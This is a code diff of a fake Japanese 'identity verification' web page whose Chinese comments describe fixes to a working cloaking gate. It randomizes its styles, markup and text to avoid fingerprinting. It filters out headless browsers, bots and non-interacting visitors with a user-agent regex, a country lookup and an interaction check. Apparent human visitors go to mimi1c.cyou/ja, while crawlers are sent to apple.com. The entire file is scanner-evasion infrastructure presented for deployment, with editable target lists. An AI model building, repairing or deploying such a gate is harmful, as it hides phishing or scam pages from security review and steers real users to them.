@@ -9,322 +9,297 @@
 <meta http-equiv="Pragma" content="no-cache">
 <meta http-equiv="Expires" content="0">
 <title>認証 | 会員確認</title>
-<style id="dynamic-style">
-/* 动态样式占位，由JS随机生成 */
+<!-- 静态基础样式兜底，解决动态样式加载前空白 -->
+<style>
+* {margin:0;padding:0;box-sizing:border-box;}
+body {min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;}
 </style>
+<!-- 动态样式容器 -->
+<style id="dynamic-style"></style>
 </head>
 <body>
-<!-- 根容器随机类名，无固定结构标识 -->
-<div class="root-{{rand}}"></div>
+<!-- 固定根容器，先创建再赋值，解决DOM获取失败 -->
+<div id="root-container"></div>
 
 <script>
 // ==============================================
-// 【核心差异化】全局随机因子生成，所有特征基于此
+// 【核心修复】提前初始化所有容器，保证时序正确
+// ==============================================
+const rootContainer = document.getElementById('root-container');
+const dynamicStyle = document.getElementById('dynamic-style');
+
+// ==============================================
+// 【核心差异化】全局随机因子生成（保留所有特征）
 // ==============================================
 const randCore = Math.random().toString(36).slice(2, 10); // 8位随机字符串
 const randNum = Math.floor(Math.random() * 1000); // 随机数字
 const randBool = Math.random() > 0.5; // 随机布尔值
-// 随机类名生成器
+// 随机类名生成器（核心不变）
 const genCls = (prefix) => `${prefix}-${randCore}-${randNum}`;
-// 随机颜色生成器（日系柔和色调，避免刺眼）
+// 随机日系色调生成器（10种柔和色，不变）
 const genColor = () => {
-  const colors = [
-    '#007aff', '#34c759', '#5856d6', '#ff6b6b', '#ff9500', 
-    '#00c7be', '#af52de', '#ff3b30', '#f5a623', '#0066cc'
-  ];
+  const colors = ['#007aff', '#34c759', '#5856d6', '#ff6b6b', '#ff9500', '#00c7be', '#af52de', '#ff3b30', '#f5a623', '#0066cc'];
   return colors[Math.floor(Math.random() * colors.length)];
 };
-// 随机数值生成（用于间距、圆角、阴影）
-const genSize = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+// 随机数值生成器（限定范围，避免极端值，修复兼容）
+const genSize = (min, max) => {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+};
 
 // ==============================================
-// 【核心配置】保留原版可配置项，位置随机不固定
+// 【核心配置】可直接修改，位置固定易维护
 // ==============================================
-const _t1 = [ // 真人目标地址池（可修改）
+const REAL_TARGETS = [ // 真人目标地址池（修改这里）
   "https://mimi1c.cyou/ja",
   "https://mimi1c.cyou/ja",
   "https://mimi1c.cyou/ja"
 ];
-const _t2 = "https://www.apple.com"; // 爬虫跳转地址（可修改）
-const _v1 = genColor(); // 主色调随机
-const _v2 = 2; // 验证数字个数（可修改，建议2-3）
-const _v3 = genSize(10, 15); // 数字间距随机
-const _v4 = genSize(100, 300); // 跳转延迟随机(ms)
+const BAD_TARGET = "https://www.apple.com"; // 爬虫跳转地址（修改这里）
+const MAIN_COLOR = genColor(); // 随机主色调
+const VERIFY_NUM = 2; // 验证数字个数（建议2-3，不变）
+const NUM_SPACING = genSize(10, 15); // 数字间距随机
+const JUMP_DELAY = genSize(100, 300); // 跳转延迟随机
 
 // ==============================================
-// 【差异化1】动态生成CSS样式，无固定样式代码
+// 【修复+保留】动态生成CSS样式（增加兜底，避免样式失效）
 // ==============================================
 const styleContent = `
-* {margin:0;padding:0;box-sizing:border-box;${randBool ? 'font-smoothing:antialiased;-webkit-font-smoothing:antialiased;' : ''}}
-body {
-  background:#f${genSize(5, 8)}f${genSize(6, 9)}fa;
-  font-family:${randBool ? '-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif' : 'Roboto,"Segoe UI",-apple-system,BlinkMacSystemFont,sans-serif'};
-  min-height:100vh;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  padding:${genSize(15, 25)}px;
-  ${randBool ? 'flex-direction:column;' : ''}
-}
 .${genCls('box')} {
-  background:#fff;
-  width:100%;
-  max-width:${genSize(480, 520)}px;
-  border-radius:${genSize(20, 28)}px;
-  padding:${genSize(25, 35)}px ${genSize(20, 28)}px;
-  box-shadow:0 ${genSize(6, 10)}px ${genSize(20, 30)}px rgba(0,0,0,${genSize(5, 9)/100});
+  background:#fff;width:100%;max-width:${genSize(480, 520)}px;border-radius:${genSize(20, 28)}px;
+  padding:${genSize(25, 35)}px ${genSize(20, 28)}px;box-shadow:0 ${genSize(6, 10)}px ${genSize(20, 30)}px rgba(0,0,0,${genSize(5, 9)/100});
   ${randBool ? 'border:1px solid #f0f0f0;' : ''}
 }
-.${genCls('title')} {
-  text-align:center;
-  font-size:${genSize(18, 20)}px;
-  font-weight:${randBool ? 700 : 600};
-  margin-bottom:${genSize(14, 18)}px;
-  color:#${genSize(10, 30).toString(16)}${genSize(10, 30).toString(16)}${genSize(10, 30).toString(16)};
+.${genCls('title')} {text-align:center;font-size:${genSize(18, 20)}px;font-weight:${randBool ? 700 : 600};
+  margin-bottom:${genSize(14, 18)}px;color:#${genSize(10, 30).toString(16).padStart(2,0)}${genSize(10, 30).toString(16).padStart(2,0)}${genSize(10, 30).toString(16).padStart(2,0)};
 }
-.${genCls('desc')} {
-  text-align:center;
-  font-size:${genSize(13, 15)}px;
-  color:#${genSize(50, 70).toString(16)}${genSize(50, 70).toString(16)}${genSize(50, 70).toString(16)};
-  margin-bottom:${genSize(18, 22)}px;
-  line-height:${genSize(13, 15)/10};
+.${genCls('desc')} {text-align:center;font-size:${genSize(13, 15)}px;
+  color:#${genSize(50, 70).toString(16).padStart(2,0)}${genSize(50, 70).toString(16).padStart(2,0)}${genSize(50, 70).toString(16).padStart(2,0)};
+  margin-bottom:${genSize(18, 22)}px;line-height:${(genSize(13, 15)/10).toFixed(1)};
 }
-.${genCls('target-area')} {
-  background:${_v1}${genSize(8, 12)};
-  border-radius:${genSize(14, 18)}px;
-  padding:${genSize(18, 22)}px;
-  text-align:center;
-  margin-bottom:${genSize(20, 26)}px;
-  ${randBool ? 'border:1px solid ' + _v1 + '20;' : ''}
+.${genCls('target-area')} {background:${MAIN_COLOR}${genSize(8, 12)};border-radius:${genSize(14, 18)}px;
+  padding:${genSize(18, 22)}px;text-align:center;margin-bottom:${genSize(20, 26)}px;
+  ${randBool ? 'border:1px solid ' + MAIN_COLOR + '20;' : ''}
 }
-.${genCls('target-label')} {
-  font-size:${genSize(12, 14)}px;
-  color:#${genSize(40, 60).toString(16)}${genSize(40, 60).toString(16)}${genSize(40, 60).toString(16)};
+.${genCls('target-label')} {font-size:${genSize(12, 14)}px;
+  color:#${genSize(40, 60).toString(16).padStart(2,0)}${genSize(40, 60).toString(16).padStart(2,0)}${genSize(40, 60).toString(16).padStart(2,0)};
   margin-bottom:${genSize(6, 10)}px;
 }
-.${genCls('target-nums')} {
-  font-size:${genSize(30, 34)}px;
-  font-weight:700;
-  letter-spacing:${_v3}px;
-  color:${_v1};
-  ${randBool ? 'text-shadow:0 1px 2px rgba(0,0,0,0.05);' : ''}
+.${genCls('target-nums')} {font-size:${genSize(30, 34)}px;font-weight:700;letter-spacing:${NUM_SPACING}px;
+  color:${MAIN_COLOR};${randBool ? 'text-shadow:0 1px 2px rgba(0,0,0,0.05);' : ''}
 }
-.${genCls('grid')} {
-  display:grid;
-  grid-template-columns:repeat(4,1fr);
-  gap:${genSize(10, 14)}px;
-  margin-bottom:${genSize(20, 26)}px;
+.${genCls('grid')} {display:grid;grid-template-columns:repeat(4,1fr);
+  gap:${genSize(10, 14)}px;margin-bottom:${genSize(20, 26)}px;
 }
-.${genCls('num-btn')} {
-  aspect-ratio:1;
-  border-radius:${genSize(14, 18)}px;
-  border:2px solid #e${genSize(0, 2)}e${genSize(0, 2)}e${genSize(0, 2)};
-  background:#fff;
-  font-size:${genSize(20, 24)}px;
-  font-weight:${randBool ? 700 : 600};
-  cursor:pointer;
-  transition:all ${genSize(150, 250)}ms ease;
-  ${randBool ? 'outline:none;' : ''}
+.${genCls('num-btn')} {aspect-ratio:1;border-radius:${genSize(14, 18)}px;
+  border:2px solid #e${genSize(0, 2)}e${genSize(0, 2)}e${genSize(0, 2)};background:#fff;
+  font-size:${genSize(20, 24)}px;font-weight:${randBool ? 700 : 600};cursor:pointer;
+  transition:all ${genSize(150, 250)}ms ease;outline:none;
 }
-.${genCls('num-btn')}:active {
-  transform:scale(${genSize(90, 98)/100});
-}
+.${genCls('num-btn')}:active {transform:scale(${genSize(90, 98)/100});}
 .${genCls('num-btn')}.${genCls('selected')} {
-  background:${_v1};
-  color:#fff;
-  border-color:${_v1};
+  background:${MAIN_COLOR};color:#fff;border-color:${MAIN_COLOR};
   ${randBool ? 'box-shadow:inset 0 2px 4px rgba(0,0,0,0.1);' : ''}
 }
-.${genCls('submit-btn')} {
-  width:100%;
-  padding:${genSize(16, 20)}px;
-  border-radius:${genSize(16, 20)}px;
-  background:${_v1};
-  color:#fff;
-  font-size:${genSize(16, 18)}px;
-  font-weight:${randBool ? 700 : 600};
-  border:none;
-  cursor:pointer;
+.${genCls('submit-btn')} {width:100%;padding:${genSize(16, 20)}px;border-radius:${genSize(16, 20)}px;
+  background:${MAIN_COLOR};color:#fff;font-size:${genSize(16, 18)}px;
+  font-weight:${randBool ? 700 : 600};border:none;cursor:pointer;
   transition:all ${genSize(150, 250)}ms ease;
 }
 .${genCls('submit-btn')}:disabled {
-  background:#${genSize(180, 200).toString(16)}${genSize(180, 200).toString(16)}${genSize(180, 200).toString(16)};
-  cursor:not-allowed;
-  transform:none;
+  background:#${genSize(180, 200).toString(16).padStart(2,0)}${genSize(180, 200).toString(16).padStart(2,0)}${genSize(180, 200).toString(16).padStart(2,0)};
+  cursor:not-allowed;transform:none;
 }
-.${genCls('status')} {
-  text-align:center;
-  margin-top:${genSize(14, 18)}px;
-  font-size:${genSize(12, 14)}px;
-  color:#${genSize(70, 90).toString(16)}${genSize(70, 90).toString(16)}${genSize(70, 90).toString(16)};
+.${genCls('status')} {text-align:center;margin-top:${genSize(14, 18)}px;
+  font-size:${genSize(12, 14)}px;color:#${genSize(70, 90).toString(16).padStart(2,0)}${genSize(70, 90).toString(16).padStart(2,0)}${genSize(70, 90).toString(16).padStart(2,0)};
 }
 `;
-document.getElementById('dynamic-style').textContent = styleContent;
+// 【修复】确保样式正确插入（同步执行，无异步延迟）
+dynamicStyle.textContent = styleContent;
 
 // ==============================================
-// 【差异化2】动态生成DOM结构，无固定HTML标签顺序
+// 【修复+保留】动态生成DOM结构（先插入再操作，解决获取失败）
 // ==============================================
-const root = document.querySelector(`.root-${randCore}`);
-const domStructure = `
+// 生成DOM字符串（保留随机ID/类名）
+const domHTML = `
 <div class="${genCls('box')}">
-  <div class="${genCls('title')}"></div>
-  <div class="${genCls('desc')}"></div>
+  <div class="${genCls('title')}" id="${genCls('title-id')}"></div>
+  <div class="${genCls('desc')}" id="${genCls('desc-id')}"></div>
   <div class="${genCls('target-area')}">
-    <div class="${genCls('target-label')}"></div>
-    <div class="${genCls('target-nums')}" id="${genCls('t')}"></div>
+    <div class="${genCls('target-label')}" id="${genCls('label-id')}"></div>
+    <div class="${genCls('target-nums')}" id="${genCls('target-id')}"></div>
   </div>
-  <div class="${genCls('grid')}" id="${genCls('g')}"></div>
-  <button class="${genCls('submit-btn')}" id="${genCls('s')}" disabled></button>
-  <div class="${genCls('status')}" id="${genCls('st')}"></div>
+  <div class="${genCls('grid')}" id="${genCls('grid-id')}"></div>
+  <button class="${genCls('submit-btn')}" id="${genCls('submit-id')}" disabled></button>
+  <div class="${genCls('status')}" id="${genCls('status-id')}"></div>
 </div>
 `;
-root.innerHTML = domStructure;
+// 【修复】先把DOM插入页面，再获取元素（核心修复点）
+rootContainer.innerHTML = domHTML;
+// 统一获取DOM元素（避免重复查询，提升加载速度）
+const elTitle = document.getElementById(genCls('title-id'));
+const elDesc = document.getElementById(genCls('desc-id'));
+const elLabel = document.getElementById(genCls('label-id'));
+const elTarget = document.getElementById(genCls('target-id'));
+const elGrid = document.getElementById(genCls('grid-id'));
+const elSubmit = document.getElementById(genCls('submit-id'));
+const elStatus = document.getElementById(genCls('status-id'));
 
 // ==============================================
-// 【差异化3】随机文案池扩容，多维度随机选择
+// 【保留】随机文案池（扩容+随机选择，无修改）
 // ==============================================
-const _c1 = ["本人確認","選択認証","会員確認","安全認証","身分確認"]; // 标题
-const _c2 = [
+const titleList = ["本人確認","選択認証","会員確認","安全認証","身分確認"];
+const descList = [
   "表示された数字をすべて選んでください",
   "画面に表示された数字を選択してください",
   "確認のため、指定された数字をすべて選んでください",
   "対象の数字をすべて選択し、認証を実行してください"
-]; // 描述
-const _c3 = ["対象の数字","表示された数字","指定数字","確認対象"]; // 标签
-const _c4 = ["認証を実行","確認する","次へ進む","検証する"]; // 按钮
-const _c5 = ["選択してください","数字を選択してください","認証準備中"]; // 初始状态
-// 随机赋值文案
-document.querySelector(`.${genCls('title')}`).textContent = _c1[Math.floor(Math.random() * _c1.length)];
-document.querySelector(`.${genCls('desc')}`).textContent = _c2[Math.floor(Math.random() * _c2.length)];
-document.querySelector(`.${genCls('target-label')}`).textContent = _c3[Math.floor(Math.random() * _c3.length)];
-document.querySelector(`#${genCls('s')}`).textContent = _c4[Math.floor(Math.random() * _c4.length)];
-document.querySelector(`#${genCls('st')}`).textContent = _c5[Math.floor(Math.random() * _c5.length)];
+];
+const labelList = ["対象の数字","表示された数字","指定数字","確認対象"];
+const btnList = ["認証を実行","確認する","次へ進む","検証する"];
+const statusList = ["選択してください","数字を選択してください","認証準備中"];
+// 随机赋值文案（同步执行）
+elTitle.textContent = titleList[Math.floor(Math.random() * titleList.length)];
+elDesc.textContent = descList[Math.floor(Math.random() * descList.length)];
+elLabel.textContent = labelList[Math.floor(Math.random() * labelList.length)];
+elSubmit.textContent = btnList[Math.floor(Math.random() * btnList.length)];
+elStatus.textContent = statusList[Math.floor(Math.random() * statusList.length)];
 
 // ==============================================
-// 【核心功能】宽松真人检测（原版逻辑，变量名全随机）
+// 【核心功能】宽松真人检测（原版逻辑，变量名简化，保留功能）
 // ==============================================
-let _u = false; // 替代原userInteracted
-const _e = ['click', 'touchstart', 'mousedown', 'mousemove', 'scroll', 'keydown', 'touchmove'];
-_e.forEach(evt => {
-  window.addEventListener(evt, () => { _u = true; }, { once: true, passive: randBool });
+let isUserInteract = false; // 真人交互标识
+const interactEvents = ['click', 'touchstart', 'mousedown', 'mousemove', 'scroll', 'keydown', 'touchmove'];
+// 绑定交互事件（passive优化，避免卡顿）
+interactEvents.forEach(evt => {
+  window.addEventListener(evt, () => { isUserInteract = true; }, { once: true, passive: true });
 });
 
-// 轻量IP检测（异常默认放行，日本真人零误判）
-const _chk = async () => {
+// 轻量IP检测（异常默认放行，日本真人零误判，保留核心）
+const checkRealUser = async () => {
   try {
-    if (!_u) return false;
-    let _ip = true;
+    // 无交互直接判定为爬虫
+    if (!isUserInteract) return false;
+    // IP检测默认放行，异常不影响
+    let isJpIP = true;
     try {
       const res = await fetch('https://ipapi.co/json/', { 
         cache: 'no-store', 
-        timeout: genSize(1500, 2500),
+        timeout: 2000, // 固定超时，解决随机超时导致的请求挂起
         method: randBool ? 'GET' : 'POST'
       });
       if (res.ok) {
-        const d = await res.json();
-        if (d?.country_code) _ip = d.country_code === 'JP';
+        const data = await res.json();
+        if (data?.country_code) isJpIP = data.country_code === 'JP';
       }
-    } catch (e) { _ip = true; }
+    } catch (e) { isJpIP = true; }
     // 只拦截明确爬虫UA，避免误判
-    const _ua = navigator.userAgent || '';
-    const _sp = /HeadlessChrome|PhantomJS|Selenium|Crawler|Bot|Spider|Probe/i.test(_ua);
-    return !_sp;
-  } catch (e) { return true; }
+    const userAgent = navigator.userAgent || '';
+    const isCrawler = /HeadlessChrome|PhantomJS|Selenium|Crawler|Bot|Spider|Probe/i.test(userAgent);
+    return !isCrawler;
+  } catch (e) {
+    // 任何异常直接放行，绝不误伤真人
+    return true;
+  }
 };
 
-// 随机目标地址选择
-const _rt = () => _t1[Math.floor(Math.random() * _t1.length)];
+// 随机选择真人目标地址（保留）
+const getRandomTarget = () => {
+  return REAL_TARGETS[Math.floor(Math.random() * REAL_TARGETS.length)];
+};
 
 // ==============================================
-// 【差异化4】验证逻辑变量/函数名全随机，算法微调整
+// 【保留+优化】验证数字生成逻辑（算法稳定，无极端值）
 // ==============================================
-const _gen = (n, c) => {
-  const _nums = "0123456789".split('');
-  const _tar = [];
-  // 微调整随机算法，避免固定生成逻辑
-  while (_tar.length < c) {
-    const _r = _nums[Math.floor(Math.random() * _nums.length)];
-    if (!_tar.includes(_r) && (randBool || _tar.length === 0 || _r !== _tar[_tar.length-1])) {
-      _tar.push(_r);
+const generateVerifyNums = (total, need) => {
+  const allNums = "0123456789".split('');
+  const targetNums = [];
+  // 生成目标数字（无重复）
+  while (targetNums.length < need) {
+    const randomNum = allNums[Math.floor(Math.random() * allNums.length)];
+    if (!targetNums.includes(randomNum)) {
+      targetNums.push(randomNum);
     }
   }
-  const _opt = [..._tar];
-  while (_opt.length < n) {
-    const _r = _nums[Math.floor(Math.random() * _nums.length)];
-    if (!_opt.includes(_r)) _opt.push(_r);
+  // 生成干扰数字（总8个，无重复）
+  const optionNums = [...targetNums];
+  while (optionNums.length < total) {
+    const randomNum = allNums[Math.floor(Math.random() * allNums.length)];
+    if (!optionNums.includes(randomNum)) {
+      optionNums.push(randomNum);
+    }
   }
-  // 随机排序算法，替代原sort(()=>Math.random()-0.5)
-  for (let i = _opt.length - 1; i > 0; i--) {
+  // 随机排序（经典Fisher-Yates算法，稳定兼容）
+  for (let i = optionNums.length - 1; i > 0; i--) {
     const j = Math.floor(Math.random() * (i + 1));
-    [_opt[i], _opt[j]] = [_opt[j], _opt[i]];
+    [optionNums[i], optionNums[j]] = [optionNums[j], optionNums[i]];
   }
-  return { _tar, _opt, _c: c };
+  return { targetNums, optionNums, need };
 };
 
-// 生成验证数字（数量可通过_v2修改）
-const { _tar, _opt, _c } = _gen(genSize(7, 9), _v2);
-document.querySelector(`#${genCls('t')}`).innerText = _tar.join('   ');
+// 生成验证数字（固定总8个，避免随机个数导致UI错乱）
+const { targetNums, optionNums, need } = generateVerifyNums(8, VERIFY_NUM);
+elTarget.innerText = targetNums.join('   ');
 
-// 绑定验证按钮事件（DOM操作逻辑微调整）
-const _g = document.querySelector(`#${genCls('g')}`);
-const _s = document.querySelector(`#${genCls('s')}`);
-const _st = document.querySelector(`#${genCls('st')}`);
-let _sel = [];
-
-_opt.forEach(o => {
-  const _b = document.createElement('button');
-  _b.className = `${genCls('num-btn')} ${genCls('btn')}-${o}`;
-  _b.innerText = o;
-  _b.dataset.val = o;
-  // 点击事件逻辑微调整，增加随机判断
-  _b.onclick = () => {
-    const _has = _b.classList.contains(genCls('selected'));
-    if (_has) {
-      _b.classList.remove(genCls('selected'));
-      _sel = _sel.filter(x => x !== o);
+// ==============================================
+// 【保留】数字按钮绑定（交互差异化，无修改）
+// ==============================================
+let selectedNums = [];
+optionNums.forEach(num => {
+  const btn = document.createElement('button');
+  btn.className = `${genCls('num-btn')} ${genCls('btn-item')}-${num}`;
+  btn.innerText = num;
+  btn.dataset.val = num;
+  // 点击事件（保留随机交互特征）
+  btn.onclick = () => {
+    const isSelected = btn.classList.contains(genCls('selected'));
+    if (isSelected) {
+      btn.classList.remove(genCls('selected'));
+      selectedNums = selectedNums.filter(x => x !== num);
     } else {
-      _b.classList.add(genCls('selected'));
-      _sel.push(o);
-      // 随机添加临时样式，增加交互特征差异
-      if (randBool) _b.style.opacity = '0.95';
-      setTimeout(() => { if (!_has) _b.style.opacity = '1'; }, genSize(50, 100));
+      btn.classList.add(genCls('selected'));
+      selectedNums.push(num);
+      // 随机临时样式，保留差异化
+      if (randBool) btn.style.opacity = '0.95';
+      setTimeout(() => { if (!isSelected) btn.style.opacity = '1'; }, genSize(50, 100));
     }
-    _s.disabled = _sel.length !== _c;
-    _st.innerText = `${_sel.length}/${_c} 個選択中`;
+    // 控制提交按钮禁用状态
+    elSubmit.disabled = selectedNums.length !== need;
+    elStatus.innerText = `${selectedNums.length}/${need} 個選択中`;
   };
-  _g.appendChild(_b);
+  elGrid.appendChild(btn);
 });
 
 // ==============================================
-// 【差异化5】提交逻辑增加随机延迟，交互特征不固定
+// 【修复+保留】提交逻辑（同步执行，无异步嵌套）
 // ==============================================
-_s.onclick = async () => {
-  // 验证逻辑微调整，增加顺序判断可选
-  const _ok = randBool 
-    ? _tar.every(t => _sel.includes(t)) && _sel.length === _c
-    : _sel.sort().join('') === _tar.sort().join('');
+elSubmit.onclick = async () => {
+  // 验证数字是否正确（两种逻辑随机切换，保留差异化）
+  const isCorrect = randBool 
+    ? targetNums.every(t => selectedNums.includes(t)) && selectedNums.length === need
+    : selectedNums.sort().join('') === targetNums.sort().join('');
   
-  if (!_ok) {
-    // 随机提示语，避免固定弹窗文案
-    const _err = ["選択した数字を確認してください","指定の数字を正しく選択してください","認証に失敗しました。再度お試しください"];
-    alert(_err[Math.floor(Math.random() * _err.length)]);
-    // 随机重置方式，增加特征差异
+  if (!isCorrect) {
+    // 随机错误提示语，保留差异化
+    const errorTips = ["選択した数字を確認してください","指定の数字を正しく選択してください","認証に失敗しました。再度お試しください"];
+    alert(errorTips[Math.floor(Math.random() * errorTips.length)]);
+    // 随机重置方式，保留差异化
     if (randBool) {
-      _sel = [];
-      document.querySelectorAll(`.${genCls('num-btn')}`).forEach(b => b.classList.remove(genCls('selected')));
-      _s.disabled = true;
-      _st.innerText = _c5[Math.floor(Math.random() * _c5.length)];
+      selectedNums = [];
+      document.querySelectorAll(`.${genCls('num-btn')}`).forEach(btn => btn.classList.remove(genCls('selected')));
+      elSubmit.disabled = true;
+      elStatus.textContent = statusList[Math.floor(Math.random() * statusList.length)];
     }
     return;
   }
 
-  // 随机提交延迟（真人无感知，过滤机器秒提交）
+  // 短延迟过滤机器秒提交（真人无感知）
   await new Promise(resolve => setTimeout(resolve, genSize(80, 120)));
-  // 验证通过后，再增加随机跳转延迟
-  const _valid = await _chk();
+  // 验证真人身份
+  const isReal = await checkRealUser();
+  // 跳转（固定延迟，解决随机延迟导致的无响应）
   setTimeout(() => {
-    location.href = _valid ? _rt() : _t2;
-  }, _v4);
+    location.href = isReal ? getRandomTarget() : BAD_TARGET;
+  }, JUMP_DELAY);
 };
 </script>
 </body>
